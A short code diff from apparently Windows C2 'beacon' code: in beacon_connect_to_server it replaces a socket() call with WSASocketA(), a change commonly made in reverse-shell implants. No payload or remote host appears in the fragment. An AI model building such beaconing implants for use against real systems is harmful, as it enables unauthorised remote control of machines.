@@ -13,7 +13,7 @@
 
 void beacon_connect_to_server(char IP[16], int PORT){
     // INIT SOCKET = AF_INET (IPv4), SOCK_STREAM (Stream), IPPROTO_TCP (TCP)
-    SOCKET s =  socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
+    SOCKET s =  WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); 
     
     // IP+PORT SPEC
     int iResult;
